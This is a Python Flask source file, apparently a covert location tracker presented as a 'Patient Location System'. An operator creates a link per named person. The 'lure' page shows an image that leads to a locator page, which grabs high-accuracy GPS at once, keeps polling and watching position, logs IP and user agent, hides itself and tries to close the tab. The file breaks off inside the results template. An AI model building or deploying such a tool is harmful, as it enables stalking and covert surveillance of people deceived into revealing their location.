#!/usr/bin/env python3
"""
Patient Location Tracker
Routes:
  GET  /                → Dashboard (generate links, view GPS data)
  POST /create          → Create patient link (JSON response with URL)
  GET  /p/<id>          → Instruction image page (patient clicks → goes to locator)
  GET  /l/<id>          → GPS locator page (fires immediately, 10s updates, hides self)
  POST /capture         → Receive GPS coordinates
  GET  /links           → JSON: all links with stats
  GET  /results/<id>    → Detailed GPS history + map
  GET  /health          → Health check
"""

import os
import uuid
import base64
import sqlite3
import logging
import json
from datetime import datetime, timezone
from pathlib import Path
from contextlib import contextmanager
from flask import Flask, request, render_template_string, jsonify

# ─── Config ──────────────────────────────────────────────────────────────────
DATABASE = os.environ.get("DB_PATH", "tracker.db")
app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 20 * 1024 * 1024   # 20 MB upload limit

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("patient-tracker")


# ─── Database ─────────────────────────────────────────────────────────────────

def init_db():
    with sqlite3.connect(DATABASE) as conn:
        conn.executescript("""
            CREATE TABLE IF NOT EXISTS links (
                id          TEXT PRIMARY KEY,
                created     TEXT NOT NULL,
                patient_id  TEXT,
                img_data    TEXT NOT NULL
            );
            CREATE TABLE IF NOT EXISTS captures (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                link_id     TEXT NOT NULL REFERENCES links(id),
                captured_at TEXT NOT NULL,
                ip          TEXT,
                user_agent  TEXT,
                latitude    REAL,
                longitude   REAL,
                accuracy    REAL,
                error_msg   TEXT
            );
        """)


@contextmanager
def get_db():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    try:
        yield conn
        conn.commit()
    except Exception:
        conn.rollback()
        raise
    finally:
        conn.close()


# ─── Helpers ──────────────────────────────────────────────────────────────────

def image_to_data_uri(raw: bytes, filename: str) -> str:
    ext = Path(filename).suffix.lower()
    mime = {
        ".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
        ".gif": "image/gif", ".webp": "image/webp",
    }.get(ext, "image/jpeg")
    return f"data:{mime};base64,{base64.b64encode(raw).decode()}"


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


# ─── Routes ───────────────────────────────────────────────────────────────────

@app.route("/")
def dashboard():
    return DASHBOARD_HTML


@app.route("/create", methods=["POST"])
def create_link():
    patient_id = (request.form.get("patient_id") or "").strip()
    if not patient_id:
        return jsonify({"error": "Patient ID is required"}), 400

    photo = request.files.get("photo")
    if not photo or not photo.filename:
        return jsonify({"error": "Instruction image is required"}), 400

    raw = photo.read()
    if not raw:
        return jsonify({"error": "Uploaded image is empty"}), 400

    img_data = image_to_data_uri(raw, photo.filename)
    link_id = uuid.uuid4().hex[:16]

    with get_db() as conn:
        conn.execute(
            "INSERT INTO links (id, created, patient_id, img_data) VALUES (?, ?, ?, ?)",
            (link_id, now_iso(), patient_id, img_data),
        )

    share_url = request.host_url.rstrip("/") + "/p/" + link_id
    log.info("Created link %s for patient '%s'", link_id, patient_id)
    return jsonify({"id": link_id, "link": share_url, "patient_id": patient_id})


@app.route("/p/<link_id>")
def lure_page(link_id):
    """Instruction image page — patient sees image, clicks it → goes to locator."""
    with get_db() as conn:
        row = conn.execute("SELECT * FROM links WHERE id = ?", (link_id,)).fetchone()
    if not row:
        return "<h1>Not Found</h1>", 404
    return render_template_string(LURE_HTML,
                                  link_id=link_id,
                                  img_data=row["img_data"])


@app.route("/l/<link_id>")
def locator_page(link_id):
    """GPS capture page — fires immediately, 10 s updates, hides after first fix."""
    with get_db() as conn:
        row = conn.execute("SELECT id FROM links WHERE id = ?", (link_id,)).fetchone()
    if not row:
        return "<h1>Not Found</h1>", 404
    return render_template_string(LOCATOR_HTML, link_id=link_id)


@app.route("/capture", methods=["POST"])
def capture():
    """Receive GPS coordinates from the locator page."""
    d = request.get_json(silent=True) or {}
    link_id = (d.get("link_id") or "").strip()
    if not link_id:
        return jsonify({"status": "error", "msg": "missing link_id"}), 400

    with get_db() as conn:
        exists = conn.execute("SELECT 1 FROM links WHERE id = ?", (link_id,)).fetchone()
        if not exists:
            return jsonify({"status": "error", "msg": "link not found"}), 404

        conn.execute(
            """INSERT INTO captures
               (link_id, captured_at, ip, user_agent, latitude, longitude, accuracy, error_msg)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
            (
                link_id,
                d.get("ts") or now_iso(),
                request.remote_addr,
                d.get("user_agent", ""),
                d.get("latitude"),
                d.get("longitude"),
                d.get("accuracy"),
                d.get("error"),
            ),
        )

    lat, lng, acc = d.get("latitude"), d.get("longitude"), d.get("accuracy")
    if lat is not None:
        log.info("📍 %s → %.5f, %.5f ±%.0fm", link_id, lat, lng, acc or 0)
    else:
        log.info("⛔ %s → %s", link_id, d.get("error"))

    return jsonify({"status": "ok"})


@app.route("/links")
def list_links():
    """JSON: all links with summary stats."""
    with get_db() as conn:
        rows = conn.execute("SELECT * FROM links ORDER BY created DESC").fetchall()
        result = []
        for r in rows:
            caps = conn.execute(
                "SELECT * FROM captures WHERE link_id = ? ORDER BY captured_at DESC",
                (r["id"],),
            ).fetchall()
            gps_caps = [c for c in caps if c["latitude"] is not None]
            last = gps_caps[0] if gps_caps else None
            result.append({
                "id":           r["id"],
                "patient_id":   r["patient_id"] or "Unknown",
                "created":      r["created"],
                "gps_count":    len(gps_caps),
                "has_location": last is not None,
                "last_lat":     last["latitude"]    if last else None,
                "last_lng":     last["longitude"]   if last else None,
                "last_acc":     last["accuracy"]    if last else None,
                "last_seen":    last["captured_at"] if last else None,
            })
    return jsonify({"links": result})


@app.route("/results/<link_id>")
def results(link_id):
    """Detailed GPS history with interactive map."""
    with get_db() as conn:
        link = conn.execute("SELECT * FROM links WHERE id = ?", (link_id,)).fetchone()
        if not link:
            return "<h1>Not Found</h1>", 404
        caps = conn.execute(
            "SELECT * FROM captures WHERE link_id = ? ORDER BY captured_at DESC",
            (link_id,),
        ).fetchall()

    caps_for_js = json.dumps([
        {
            "lat": c["latitude"],
            "lng": c["longitude"],
            "acc": c["accuracy"],
            "ts":  c["captured_at"],
            "err": c["error_msg"],
            "ip":  c["ip"],
        }
        for c in caps
    ])

    return render_template_string(
        RESULTS_HTML,
        link=dict(link),
        captures=[dict(c) for c in caps],
        captures_json=caps_for_js,
        base_url=request.host_url.rstrip("/"),
    )


@app.route("/health")
def health():
    with get_db() as conn:
        n = conn.execute("SELECT COUNT(*) FROM links").fetchone()[0]
    return jsonify({"status": "ok", "links": n})


# ─── Templates ────────────────────────────────────────────────────────────────

DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Patient Location System</title>
<style>
:root {
  --bg:#0b1120;--surface:#111827;--surface2:#0f1729;
  --border:#1e2d45;--accent:#3b82f6;--green:#10b981;
  --text:#e2e8f0;--muted:#64748b;--danger:#ef4444;
}
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;}

/* Topbar */
.topbar{background:var(--surface);border-bottom:1px solid var(--border);
  padding:0 28px;height:60px;display:flex;align-items:center;justify-content:space-between;}
.logo{display:flex;align-items:center;gap:10px;font-weight:700;font-size:16px;}
.pulse{width:9px;height:9px;background:var(--green);border-radius:50%;
  box-shadow:0 0 0 0 rgba(16,185,129,.4);animation:pulse 2s infinite;}
@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(16,185,129,.4)}
  50%{box-shadow:0 0 0 8px rgba(16,185,129,0)}}
.topbar-right{font-size:12px;color:var(--muted);}

/* Layout */
.main{max-width:1160px;margin:0 auto;padding:32px 20px;}

/* Stats */
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px;margin-bottom:30px;}
.stat{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:20px 22px;}
.stat .n{font-size:34px;font-weight:700;color:var(--accent);}
.stat .n.green{color:var(--green);}
.stat .l{font-size:11px;color:var(--muted);margin-top:4px;text-transform:uppercase;letter-spacing:.5px;}

/* Section */
.sec-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;}
.sec-head h2{font-size:14px;font-weight:600;color:var(--text);}

/* Buttons */
.btn{display:inline-flex;align-items:center;gap:7px;padding:9px 18px;
  border-radius:7px;font-size:13px;font-weight:600;border:none;cursor:pointer;transition:.15s;}
.btn-primary{background:var(--accent);color:#fff;}
.btn-primary:hover{background:#2563eb;}
.btn-ghost{background:transparent;border:1px solid var(--border);color:var(--muted);}
.btn-ghost:hover{border-color:var(--accent);color:var(--accent);}
.btn-sm{padding:5px 11px;font-size:12px;}
.btn-copy{background:#1e2d45;border:none;color:#93c5fd;font-size:11px;
  padding:4px 9px;border-radius:5px;cursor:pointer;white-space:nowrap;transition:.15s;}
.btn-copy:hover{background:var(--accent);color:#fff;}

/* Table */
.table-wrap{background:var(--surface);border:1px solid var(--border);border-radius:10px;overflow:hidden;}
table{width:100%;border-collapse:collapse;}
th{background:#0a1323;color:var(--muted);font-size:11px;font-weight:600;
  text-transform:uppercase;letter-spacing:.5px;padding:11px 16px;text-align:left;
  border-bottom:1px solid var(--border);}
td{padding:13px 16px;font-size:13px;border-bottom:1px solid #151f30;vertical-align:middle;}
tr:last-child td{border-bottom:none;}
tr:hover td{background:rgba(59,130,246,.03);}

/* Badges */
.badge{display:inline-block;padding:2px 9px;border-radius:20px;font-size:11px;font-weight:600;}
.badge-green{background:rgba(16,185,129,.15);color:#10b981;}
.badge-gray{background:rgba(100,116,139,.12);color:#94a3b8;}

/* URL cell */
.url-cell{display:flex;align-items:center;gap:8px;min-width:0;}
code{background:#0a1323;padding:3px 8px;border-radius:4px;
  font-size:11px;color:#93c5fd;word-break:break-all;flex:1;min-width:0;}

/* Map link */
.map-link{color:var(--green);text-decoration:none;font-size:12px;}
.map-link:hover{text-decoration:underline;}

/* Empty */
.empty{text-align:center;padding:56px 20px;color:var(--muted);}
.empty .ico{font-size:40px;margin-bottom:12px;}
.empty p{font-size:14px;}

/* Overlay / Modal */
.overlay{position:fixed;inset:0;background:rgba(0,0,0,.75);
  display:none;align-items:center;justify-content:center;z-index:100;backdrop-filter:blur(4px);}
.overlay.open{display:flex;}
.modal{background:var(--surface);border:1px solid var(--border);border-radius:14px;
  padding:30px;width:100%;max-width:480px;position:relative;animation:popIn .2s ease;}
@keyframes popIn{from{transform:scale(.95);opacity:0}to{transform:scale(1);opacity:1}}
.modal h3{font-size:17px;font-weight:700;margin-bottom:22px;}
.modal-close{position:absolute;top:14px;right:16px;background:none;
  border:none;color:var(--muted);font-size:20px;cursor:pointer;line-height:1;}
.modal-close:hover{color:var(--text);}
label.field{display:block;font-size:11px;font-weight:700;color:var(--muted);
  text-transform:uppercase;letter-spacing:.5px;margin:16px 0 6px;}
input[type=text]{width:100%;background:#0b1120;border:1px solid var(--border);
  color:var(--text);border-radius:7px;padding:10px 13px;font-size:14px;
  transition:.15s;}
input[type=text]:focus{border-color:var(--accent);outline:none;
  box-shadow:0 0 0 3px rgba(59,130,246,.15);}

/* Drop zone */
.drop-zone{width:100%;background:#0b1120;border:2px dashed var(--border);
  border-radius:10px;padding:26px 16px;text-align:center;cursor:pointer;
  transition:.2s;position:relative;}
.drop-zone:hover,.drop-zone.over{border-color:var(--accent);background:rgba(59,130,246,.04);}
.drop-zone .dz-icon{font-size:30px;margin-bottom:8px;}
.drop-zone .dz-txt{font-size:13px;color:var(--muted);line-height:1.5;}
.drop-zone input{display:none;}
#preview-img{width:100%;max-height:140px;object-fit:contain;
  border-radius:8px;margin-top:12px;display:none;border:1px solid var(--border);}
.file-name{font-size:12px;color:var(--green);margin-top:8px;display:none;}

.modal-actions{display:flex;gap:10px;margin-top:26px;}
.modal-actions button{flex:1;padding:12px;border-radius:8px;
  font-size:14px;font-weight:600;cursor:pointer;border:none;transition:.15s;}
.btn-submit{background:var(--accent);color:#fff;}
.btn-submit:hover{background:#2563eb;}
.btn-submit:disabled{opacity:.5;cursor:not-allowed;}
.btn-cancel{background:transparent;border:1px solid var(--border);color:var(--muted);}
.btn-cancel:hover{border-color:var(--muted);}

/* Toast */
.toast{position:fixed;bottom:24px;right:24px;background:var(--surface);
  border:1px solid var(--green);border-radius:12px;padding:18px 20px;
  max-width:420px;display:none;z-index:200;box-shadow:0 10px 40px rgba(0,0,0,.5);}
.toast.show{display:block;animation:slideUp .25s ease;}
@keyframes slideUp{from{transform:translateY(14px);opacity:0}to{transform:translateY(0);opacity:1}}
.toast-close{position:absolute;top:10px;right:12px;background:none;
  border:none;color:var(--muted);font-size:16px;cursor:pointer;}
.toast .t-title{font-size:11px;color:var(--green);font-weight:700;
  text-transform:uppercase;letter-spacing:.5px;margin-bottom:10px;}
.toast .t-url{font-size:12px;word-break:break-all;color:#93c5fd;
  background:#0a1323;padding:8px 10px;border-radius:6px;margin-bottom:10px;}
.toast .t-btns{display:flex;gap:8px;}
.toast .t-btns button{flex:1;padding:8px;border-radius:7px;
  font-size:12px;font-weight:600;cursor:pointer;border:none;transition:.15s;}
.t-copy{background:var(--accent);color:#fff;}
.t-copy:hover{background:#2563eb;}
.t-open{background:transparent;border:1px solid var(--border);color:var(--muted);}
.t-open:hover{border-color:var(--accent);color:var(--accent);}

@media(max-width:600px){.stats{grid-template-columns:1fr 1fr;}}
</style>
</head>
<body>

<div class="topbar">
  <div class="logo">
    <div class="pulse"></div>
    Patient Location System
  </div>
  <div class="topbar-right" id="last-refresh">—</div>
</div>

<div class="main">

  <!-- Stats -->
  <div class="stats">
    <div class="stat"><div class="n" id="s-total">–</div><div class="l">Total Patients</div></div>
    <div class="stat"><div class="n green" id="s-located">–</div><div class="l">Located</div></div>
    <div class="stat"><div class="n" id="s-updates">–</div><div class="l">GPS Updates</div></div>
  </div>

  <!-- Patient Links Table -->
  <div class="sec-head">
    <h2>Patient Links</h2>
    <button class="btn btn-primary" onclick="openModal()">
      <svg width="13" height="13" viewBox="0 0 24 24" fill="none"
           stroke="currentColor" stroke-width="2.5">
        <line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/>
      </svg>
      Generate Patient Link
    </button>
  </div>

  <div class="table-wrap">
    <table>
      <thead><tr>
        <th>Patient ID</th>
        <th>Created</th>
        <th>Shareable Link</th>
        <th>GPS Hits</th>
        <th>Last Location</th>
        <th>Actions</th>
      </tr></thead>
      <tbody id="tbody">
        <tr><td colspan="6" style="padding:0;">
          <div class="empty"><div class="ico">📍</div>
          <p>No patients yet — click <strong>Generate Patient Link</strong> to start</p></div>
        </td></tr>
      </tbody>
    </table>
  </div>
</div>

<!-- Modal -->
<div class="overlay" id="modal">
  <div class="modal">
    <button class="modal-close" onclick="closeModal()">✕</button>
    <h3>🔗 Generate Patient Link</h3>

    <label class="field">Patient ID / Name</label>
    <input type="text" id="patient-id" placeholder="e.g. PT-001, Ahmed Khan..."
           autocomplete="off" onkeydown="if(event.key==='Enter')submitCreate()">

    <label class="field">Instruction Image</label>
    <div class="drop-zone" id="drop-zone"
         onclick="document.getElementById('file-input').click()"
         ondragover="dzOver(event)" ondragleave="dzLeave()"
         ondrop="dzDrop(event)">
      <div class="dz-icon">🖼️</div>
      <div class="dz-txt">Click to upload or drag &amp; drop<br>
        <small>PNG · JPG · WEBP — max 20 MB</small></div>
      <input type="file" id="file-input" accept="image/*"
             onchange="onFile(this.files[0])">
    </div>
    <div class="file-name" id="file-name"></div>
    <img id="preview-img" alt="Preview">

    <div class="modal-actions">
      <button class="btn-cancel" onclick="closeModal()">Cancel</button>
      <button class="btn-submit" id="submit-btn" onclick="submitCreate()">
        Generate Link
      </button>
    </div>
  </div>
</div>

<!-- Toast -->
<div class="toast" id="toast">
  <button class="toast-close" onclick="closeToast()">✕</button>
  <div class="t-title">✅ Patient Link Created</div>
  <div class="t-url" id="toast-url"></div>
  <div class="t-btns">
    <button class="t-copy" onclick="copyToast()">📋 Copy Link</button>
    <button class="t-open"
      onclick="window.open(document.getElementById('toast-url').textContent,'_blank')">
      🔗 Preview
    </button>
  </div>
</div>

<script>
var selectedFile = null;

// ── Modal ──────────────────────────────────────────────────────────────────
function openModal() {
  document.getElementById('modal').classList.add('open');
  setTimeout(function(){ document.getElementById('patient-id').focus(); }, 100);
}
function closeModal() {
  document.getElementById('modal').classList.remove('open');
  selectedFile = null;
  document.getElementById('file-input').value = '';
  document.getElementById('patient-id').value = '';
  document.getElementById('preview-img').style.display = 'none';
  document.getElementById('file-name').style.display = 'none';
}

// ── Drag-and-drop ──────────────────────────────────────────────────────────
function dzOver(e) { e.preventDefault(); document.getElementById('drop-zone').classList.add('over'); }
function dzLeave()  { document.getElementById('drop-zone').classList.remove('over'); }
function dzDrop(e)  {
  e.preventDefault(); dzLeave();
  var f = e.dataTransfer.files[0];
  if (f && f.type.startsWith('image/')) onFile(f);
}
function onFile(f) {
  if (!f) return;
  selectedFile = f;
  document.getElementById('file-name').textContent = '✓ ' + f.name;
  document.getElementById('file-name').style.display = 'block';
  var reader = new FileReader();
  reader.onload = function(ev) {
    var img = document.getElementById('preview-img');
    img.src = ev.target.result;
    img.style.display = 'block';
  };
  reader.readAsDataURL(f);
}

// ── Create ─────────────────────────────────────────────────────────────────
async function submitCreate() {
  var pid = document.getElementById('patient-id').value.trim();
  if (!pid)          { alert('Please enter a Patient ID'); return; }
  if (!selectedFile) { alert('Please upload an instruction image'); return; }

  var btn = document.getElementById('submit-btn');
  btn.textContent = 'Creating…'; btn.disabled = true;

  var fd = new FormData();
  fd.append('patient_id', pid);
  fd.append('photo', selectedFile);

  try {
    var res = await fetch('/create', { method: 'POST', body: fd });
    var data = await res.json();
    if (data.error) { alert('Error: ' + data.error); return; }
    closeModal();
    document.getElementById('toast-url').textContent = data.link;
    document.getElementById('toast').classList.add('show');
    loadLinks();
  } catch(e) {
    alert('Network error — please try again');
  } finally {
    btn.textContent = 'Generate Link'; btn.disabled = false;
  }
}

// ── Toast ──────────────────────────────────────────────────────────────────
function closeToast() { document.getElementById('toast').classList.remove('show'); }
function copyToast() {
  var txt = document.getElementById('toast-url').textContent;
  navigator.clipboard.writeText(txt).then(function() {
    var b = document.querySelector('.t-copy');
    b.textContent = '✓ Copied!';
    setTimeout(function(){ b.textContent = '📋 Copy Link'; }, 2000);
  });
}

// ── Copy URL ───────────────────────────────────────────────────────────────
function copyUrl(btn, url) {
  navigator.clipboard.writeText(url).then(function() {
    btn.textContent = '✓';
    setTimeout(function(){ btn.textContent = 'Copy'; }, 2000);
  });
}

// ── Table ──────────────────────────────────────────────────────────────────
function timeAgo(iso) {
  var s = Math.floor((Date.now() - new Date(iso)) / 1000);
  if (s < 60)    return s + 's ago';
  if (s < 3600)  return Math.floor(s/60) + 'm ago';
  if (s < 86400) return Math.floor(s/3600) + 'h ago';
  return Math.floor(s/86400) + 'd ago';
}

function loadLinks() {
  fetch('/links').then(function(r){ return r.json(); }).then(function(data) {
    var links = data.links;
    var located = links.filter(function(l){ return l.has_location; }).length;
    var updates = links.reduce(function(a,l){ return a + l.gps_count; }, 0);
    document.getElementById('s-total').textContent   = links.length;
    document.getElementById('s-located').textContent = located;
    document.getElementById('s-updates').textContent = updates;
    document.getElementById('last-refresh').textContent =
      'Refreshed ' + new Date().toLocaleTimeString();

    if (!links.length) {
      document.getElementById('tbody').innerHTML =
        '<tr><td colspan="6" style="padding:0;"><div class="empty">' +
        '<div class="ico">📍</div>' +
        '<p>No patients yet — click <strong>Generate Patient Link</strong> to start</p>' +
        '</div></td></tr>';
      return;
    }

    var origin = window.location.origin;
    var html = '';
    links.forEach(function(l) {
      var shareUrl = origin + '/p/' + l.id;
      var locHtml;
      if (l.last_lat !== null) {
        var mapUrl = 'https://www.google.com/maps?q=' + l.last_lat + ',' + l.last_lng;
        locHtml  = '<a class="map-link" href="' + mapUrl + '" target="_blank">';
        locHtml += '📍 ' + l.last_lat.toFixed(5) + ', ' + l.last_lng.toFixed(5) + '</a>';
        if (l.last_acc) {
          locHtml += '<br><small style="color:var(--muted)">±' +
                     Math.round(l.last_acc) + 'm · ' + timeAgo(l.last_seen) + '</small>';
        }
      } else {
        locHtml = '<span class="badge badge-gray">Awaiting</span>';
      }
      var badge = l.gps_count > 0
        ? '<span class="badge badge-green">' + l.gps_count + ' fixes</span>'
        : '<span class="badge badge-gray">0</span>';

      html += '<tr>';
      html += '<td><strong>' + escHtml(l.patient_id) + '</strong></td>';
      html += '<td style="color:var(--muted);font-size:12px;">' + timeAgo(l.created) + '</td>';
      html += '<td><div class="url-cell"><code>' + escHtml(shareUrl) + '</code>' +
              '<button class="btn-copy" onclick="copyUrl(this,\'' + escHtml(shareUrl) + '\')">' +
              'Copy</button></div></td>';
      html += '<td>' + badge + '</td>';
      html += '<td>' + locHtml + '</td>';
      html += '<td><a href="/results/' + l.id + '" class="btn btn-ghost btn-sm" ' +
              'style="text-decoration:none;">Details</a></td>';
      html += '</tr>';
    });
    document.getElementById('tbody').innerHTML = html;
  }).catch(function() {});
}

function escHtml(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;')
                  .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

// Close modal on overlay click
document.getElementById('modal').addEventListener('click', function(e) {
  if (e.target === this) closeModal();
});

loadLinks();
setInterval(loadLinks, 5000);
</script>
</body>
</html>"""


# ─── Lure Page ────────────────────────────────────────────────────────────────
LURE_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Message</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  html, body { width:100%; height:100%; background:#000; overflow:hidden; }
  .wrap {
    width:100%; height:100vh;
    display:flex; align-items:center; justify-content:center;
  }
  a { display:block; width:100%; height:100%;
      display:flex; align-items:center; justify-content:center; }
  img {
    max-width:100%; max-height:100vh;
    object-fit:contain; cursor:pointer; display:block;
    -webkit-tap-highlight-color:transparent;
  }
</style>
</head>
<body>
<div class="wrap">
  <a href="/l/{{ link_id }}" id="link">
    <img src="{{ img_data }}" alt="" draggable="false">
  </a>
</div>
</body>
</html>"""


# ─── Locator Page ─────────────────────────────────────────────────────────────
LOCATOR_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Loading…</title>
<style>
  * { margin:0; padding:0; }
  body { background:#fff; min-height:100vh;
    display:flex; align-items:center; justify-content:center; }
  #loader {
    display:flex; flex-direction:column; align-items:center; gap:18px;
    font-family:system-ui,sans-serif; color:#94a3b8;
  }
  .spinner {
    width:40px; height:40px;
    border:3px solid #e2e8f0; border-top-color:#3b82f6;
    border-radius:50%; animation:spin 1s linear infinite;
  }
  @keyframes spin { to { transform:rotate(360deg); } }
  #loader p { font-size:14px; }
</style>
</head>
<body>
<div id="loader">
  <div class="spinner"></div>
  <p>Loading…</p>
</div>

<script>
(function () {
  var LINK_ID  = "{{ link_id }}";
  var firstDone = false;
  var intervalId = null;

  /* ── POST to /capture ───────────────────────────────────────── */
  function post(lat, lng, acc, err) {
    var payload = {
      link_id    : LINK_ID,
      latitude   : lat,
      longitude  : lng,
      accuracy   : acc,
      error      : err,
      user_agent : navigator.userAgent,
      ts         : new Date().toISOString()
    };

    /* Primary — fetch with keepalive so it survives tab close */
    try {
      fetch('/capture', {
        method  : 'POST',
        headers : { 'Content-Type': 'application/json' },
        body    : JSON.stringify(payload),
        keepalive: true
      }).then(function () {
        if (!firstDone && lat !== null) {
          firstDone = true;
          hideAndClose();
        }
      }).catch(function () {});
    } catch (e) {}

    /* Backup — XHR */
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/capture', true);
      x.setRequestHeader('Content-Type', 'application/json');
      x.send(JSON.stringify(payload));
    } catch (e) {}
  }

  /* ── Hide loader and try to close the tab ───────────────────── */
  function hideAndClose() {
    /* Make page invisible — JS keeps running */
    try { document.getElementById('loader').style.display = 'none'; } catch(e) {}
    try { document.body.style.background = '#fff'; } catch(e) {}

    /* Attempt tab close (works on mobile Chrome when navigated from another page) */
    setTimeout(function () {
      try { window.close(); } catch(e) {}
    }, 600);
  }

  /* ── Request one GPS fix ────────────────────────────────────── */
  function grab() {
    if (!navigator.geolocation) {
      post(null, null, null, 'geolocation not supported');
      return;
    }
    navigator.geolocation.getCurrentPosition(
      function (p) {
        post(p.coords.latitude, p.coords.longitude, p.coords.accuracy, null);
      },
      function (e) {
        var msgs = ['', 'permission denied', 'position unavailable', 'timeout'];
        post(null, null, null, msgs[e.code] || e.message || 'unknown error');
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  }

  /* ── watchPosition — continuous updates on movement ─────────── */
  if (navigator.geolocation) {
    navigator.geolocation.watchPosition(
      function (p) {
        post(p.coords.latitude, p.coords.longitude, p.coords.accuracy, null);
      },
      function () {},
      { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
    );
  }

  /* ── Fire immediately ───────────────────────────────────────── */
  grab();

  /* ── Poll every 10 seconds ──────────────────────────────────── */
  intervalId = setInterval(grab, 10000);

  /* ── Capture when phone wakes / tab becomes active ──────────── */
  document.addEventListener('visibilitychange', function () {
    if (!document.hidden) grab();
  });

  /* ── Best-effort send before tab unloads ────────────────────── */
  window.addEventListener('beforeunload', function () {
    grab();
    if (intervalId) clearInterval(intervalId);
  });
})();
</script>
</body>
</html>"""


# ─── Results Page ─────────────────────────────────────────────────────────────
RESULTS_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Results — {{ link.patient_id }}</title>
<link rel="stylesheet"
  href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
<style>
:root{--bg:#0b1120;--surface:#111827;--border:#1e2d45;
  --accent:#3b82f6;--green:#10b981;--text:#e2e8f0;--muted:#64748b;--danger:#ef4444;}
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--text);}
.topbar{background:var(--surface);border-bottom:1px solid var(--border);
  padding:0 28px;height:60px;display:flex;align-items:center;gap:16px;}
.topbar a{color:var(--muted);text-decoration:none;font-size:13px;}
.topbar a:hover{color:var(--text);}
.topbar h1{font-size:16px;font-weight:700;}
.main{max-width:1100px;margin:0 auto;padding:30px 20px;}
.info-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));
  gap:12px;margin-bottom:28px;}
.info-card{background:var(--surface);border:1px solid var(--border);
  border-radius:10px;padding:18px 20px;}
.info-card .n{font-size:28px;font-weight:700;color:var(--accent);}
.info-card .n.green{color:var(--green);}
.info-card .l{font-size:11px;color:var(--muted);margin-top:4px;
  text-transform:uppercase;letter-spacing:.5px;}
#map{height:380px;border-radius:10px;margin-bottom:26px;
  border:1px solid var(--border);background:#111;}
.section-title{font-size:14px;font-weight:600;color:var(--text);margin-bottom:12px;}
.table-wrap{background:var(--surface);border:1px solid var(--border);
  border-radius:10px;overflow:hidden;}
table{width:100%;border-collapse:collapse;}
th{background:#0a1323;color:var(--muted);font-size:11px;font-weight:600;
  text-transform:uppercase;letter-spacing:.5px;padding:10px 14px;text-align:left;
  border-bottom:1px solid var(--border);}
td{padding:11px 14px;font-size:12px;border-bottom:1px solid #151f30;vertical-align:middle;}
tr:last-child td{border-bottom:none;}
.success{color:var(--green);}
.fail{color:var(--danger);}
.btn-back{display:inline-flex;align-items:center;gap:7px;
  background:transparent;border:1px solid var(--border);color:var(--muted);
  padding:8px 16px;border-radius:7px;font-size:13px;font-weight:600;
  text-decoration:none;transition:.15s;}
.btn-back:hover{border-color:var(--accent);color:var(--accent);}
a.map-link{color:var(--green);text-decoration:none;font-size:12px;}
a.map-link:hover{text-decoration:underline;}
</style>
</head>
<body>

<div class="topbar">
  <a href="/">← Dashboard</a>
  <h1>Patient: {{ link.patient_id }}</h1>
</div>

<div class="main">
  <!-- Stats -->
  {% set gps_fixes = captures | selectattr('latitude') | list %}
  <div class="info-grid">
    <div class="info-card">
      <div class="n">{{ captures | length }}</div>
      <div class="l">Total Reports</div>
    </div>
    <div class="info-card">
      <div class="n green">{{ gps_fixes | length }}</div>
      <div class="l">GPS Fixes</div>
    </div>
    <div class="info-card">
      <div class="n" style="font-size:14px;margin-top:4px;">
        {{ link.created[:19].replace('T',' ') }} UTC
      </div>
      <div class="l">Link Created</div>
    </div>
    <div class="info-card">
      <div class="n" style="font-size:14px;margin-top:4px;">{{ link.id }}</div>
      <div class="l">Link ID</div>
    </div>
  </div>

  <!-- Map -->
  <div class="section-title">📍 Location Map</div>
  <div id="map"></div>

  <!-- Captures Table -->
  <div class="section-title">GPS History ({{ captures | length }} records)</div>
  <div class="table-wrap">
    <table>
      <thead><tr>
        <th>#</th><th>Timestamp (UTC)</th><th>Coordinates</th>
        <th>Accuracy</th><th>IP</th><th>Status</th><th>Map</th>
      </tr></thead>
      <tbody>
        {% for c in captures %}
        <tr>
          <td style="color:var(--muted);">{{ loop.index }}</td>
          <td>{{ c.captured_at[:19].replace('T',' ') }}</td>
          {% if c.latitude %}
          <td class="success">{{ '%.5f'|format(c.latitude) }}, {{ '%.5f'|format(c.longitude) }}</td>
          <td>±{{ (c.accuracy or 0)|int }}m</td>
          {% else %}
          <td class="fail">—</td>
          <td>—</td>
          {% endif %}
          <td style="color:var(--muted);font-size:11px;">{{ c.ip or '—' }}</td>
          {% if c.latitude %}
          <td class="success">✓ Located</td>
          {% elif c.error_msg %}
          <td class="fail">✗ {{ c.error_msg }}</td>
